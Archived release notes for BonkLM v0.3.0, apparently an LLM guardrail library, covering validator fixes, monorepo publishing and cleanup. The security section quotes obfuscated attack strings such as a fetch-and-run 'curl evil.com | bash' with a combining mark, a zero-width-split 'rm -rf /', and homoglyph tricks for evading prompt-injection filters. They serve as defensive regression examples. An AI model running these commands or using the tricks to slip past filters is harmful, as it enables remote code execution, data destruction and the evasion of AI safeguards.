# BonkLM Release Notes

> Latest release: **v1.0.0-rc.4** (2026-05-26). Full per-sprint detail in
> [CHANGELOG.md](./CHANGELOG.md#100-rc4--2026-05-26-sprint-51-day-1-cut). Per-sprint notes between
> v0.3.0 and v1.0.0-rc.4 (covering v0.4.0, v0.5.0, v0.6.0, v0.7.0, and v1.0.0-rc.x) live in the
> CHANGELOG.

This file preserves the v0.3.0 release announcement as a historical archive. For all releases after
v0.3.0, see the CHANGELOG.

---

## v0.3.0 — 2026-05-20 (archived)

### Overview

BonkLM v0.3.0 aligns the entire package family (core, logger, wizard, 20+ connectors, openclaw
adapter) at version `0.3.0`, removes internal development scaffolding from the public repo, lands
several runtime and security correctness fixes, and switches the monorepo to changesets-driven
publishing.

This is the first release where every package in the monorepo ships from the same
`pnpm exec changeset publish` invocation. Previously only `@blackunicorn/bonklm` (core) made it to
npm.

### What's New

#### Single-version monorepo policy

All packages now release together at the same version, governed by a `fixed` group in
`.changeset/config.json`. No more drift between `core@0.2.0`, `connector@1.1.0`, `openclaw@0.1.0`,
`wizard@0.2.0-deprecated`.

#### Security correctness fixes

- **Bash-safety guard runs again.** `require('path')` (which throws `ReferenceError` in this ESM
  package) replaced with `node:path` import. The `rm -rf` path-containment check now actually
  executes instead of crashing the validator.
- **Unicode normalisation order corrected.** The text normaliser used `NFKC` (compose) followed by
  combining-mark strip. NFKC re-composed precomposed characters (`U+016D` etc.) into single code
  points that the strip regex could no longer reach, leaving obfuscation attacks like
  `cŭrl evil.com | bash`, `evạl $danger` undetected. Now uses `NFKD` (decompose), strips the marks,
  then continues. Adversarial regression test added.
- **Normalisation now reaches all guards.** Previously only the prompt-injection validator
  normalised input. Bash-safety, XSS, and secret guards each apply `normalizeText()` at their entry,
  defeating zero-width-character splitting (`r​m -rf /`) and homoglyph bypass. Bash-safety also
  normalises `cwd` so path-containment works for users with Cyrillic / Greek / precomposed-character
  home directories.
- **XSS `//`-line skip removed.** Adversarial LLM output prefixed with `//` is now scanned.
  `getXSSReport()` also now applies normalisation (previously bypassed).
- **OpenAI `sk-proj-*` 2024+ keys detected.** Legacy regex required the `T3BlbkFJ` infix; the new
  pattern catches the post-2024 format that doesn't carry the marker.
- **Mailgun pattern tightened.** Old `key-[A-Za-z0-9]{32}` triggered on feature flags and config-key
  identifiers; new pattern requires a `mailgun|api_key|mg_key` prefix.
- **Decoded payload checks use the full pattern engine.** `prompt-injection.ts` used a 4-keyword
  regex (`ignore|override|bypass|disable`) against decoded base64 / multi-layer-encoding content;
  now uses `detectPatterns()` over the complete pattern suite.
- **Weight-calculation operator-precedence bug fixed** in `express-middleware`, `fastify-plugin`,
  `nestjs-module`. `finding.weight || severity === CRITICAL ? 5 : ...` (parsed as
  `(weight || severity === CRITICAL) ? 5 : ...`) replaced with
  `finding.weight ?? (severity === CRITICAL ? 5 : ...)`. Pre-existing bug surfaced during the audit.
- **Stream-validator `hasUnvalidatedTail()` helper added.** Documents the post-stream
  final-validation contract for connector authors. (Not yet wired into individual connectors —
  tracked as a follow-up to land the enforced lifecycle.)

#### Build, CI, publishing

- **Cross-platform build.** BSD-only `sed -i ''` in `packages/core/package.json` replaced with a
  Node one-liner so Ubuntu CI no longer silently writes garbage to `dist/bin/run.js`.
- **Node engine bumped to `>=20.0.0`.** Node 18 went EOL April 2025; dropped from every package's
  `engines` field and from CI matrices.
- **Coverage thresholds enforced** in `vitest.config.ts` (80/80/80 lines/functions/statements, 75%
  branches) on `packages/core/src/**`.
- **`@changesets/cli` installed and configured.** All 22 packages are in a `fixed` group.
  `publish.yml` now runs `pnpm exec changeset publish` which rewrites `workspace:*` to actual
  published versions at publish time. Prerelease tags (`v0.3.0-rc.1` etc.) are now blocked from
  accidentally publishing as stable releases.
- **Deprecated `actions/create-release@v1`** in `publish.yml` replaced with
  `softprops/action-gh-release@v2` (the original was archived in 2022).
- **CLI `--version`** now reads from `package.json` at runtime instead of carrying a hard-coded
  `0.1.0`.

#### Removed

- Entire internal development scaffolding (`.claude/validators-node/`, `tools/`, root-level
  `tests/`, `examples/`, `scripts/`, `.githooks/`, stale `dist/`, `package-lock.json`). Path aliases
  in `vitest.config.ts` (`@framework`, `@validators`) removed.
- 688 stale `.js` / `.d.ts` / `.js.map` / `.d.ts.map` files alongside `.ts` source under
  `packages/*/src/` — leftover build outputs that were masking real type errors.
- Broken `cli` entry from `packages/core/package.json`'s `bin` field (pointed at a non-existent
  `.ts` source).
- The wizard package's `-deprecated` tag.
- False `35+ pattern categories` claim — reconciled to `35+ patterns across 6 categories` in README,
  docs, and CHANGELOG.

#### Repo hygiene

- `team/` is now globally gitignored per `CLAUDE.md` (was 151 tracked files including security audit
  reports). BonkLM-relevant artefacts that lived in `team/` (UAT harness, performance benchmarks)
  moved to `packages/core/uat/` and `packages/core/benchmarks/`.
- `bonklm-intro.pptx` moved from repo root to `assets/presentations/`.
- Lint clean: `pnpm exec eslint .` exits 0 with zero errors, zero warnings.
- Type-check clean: `pnpm exec tsc --noEmit` exits 0.

### Known Follow-ups

- File-size cap violations (`jailbreak.ts` 1418, `engine/GuardrailEngine.ts` 926,
  `langchain-connector/guardrails-handler.ts` 852) — deferred to dedicated refactor PR.
- `hasUnvalidatedTail()` not yet wired into individual connectors. Each connector currently
  accumulates streams with its own logic. A future change will refactor to use the helper and add an
  enforced lifecycle wrapper class.
- Connector packages depend on third-party SDKs (`openclaw`, `mastra-related`, etc.) with their own
  upstream advisories. These surface to consumers at install time and are not gated by the BonkLM CI
  audit.

### Installation

```bash
npm install @blackunicorn/bonklm
# or with a specific connector
npm install @blackunicorn/bonklm-openai @blackunicorn/bonklm
```

### Migration from v0.2.0

This is a coordinated release; nothing in the public API of `@blackunicorn/bonklm` changed in a
breaking way. Connectors that previously held v1.x version numbers are now at 0.3.0 alongside core.
If you pinned `bonklm-openai@1.1.0` etc., update to `^0.3.0`.

The Slack / Stripe / OpenAI fixtures in `secret.test.ts` were corrected to match the documented
regex shapes; if you depend on the wizard's CLI version string in tests or telemetry, note that it
now reflects the actual package version instead of `0.1.0`.

### Links

- CHANGELOG: [CHANGELOG.md](./CHANGELOG.md)
- Lessons learned: `team/lessonslearned.md` (local-only, gitignored)
- Issue tracker: https://github.com/blackunicorn/bonklm/issues
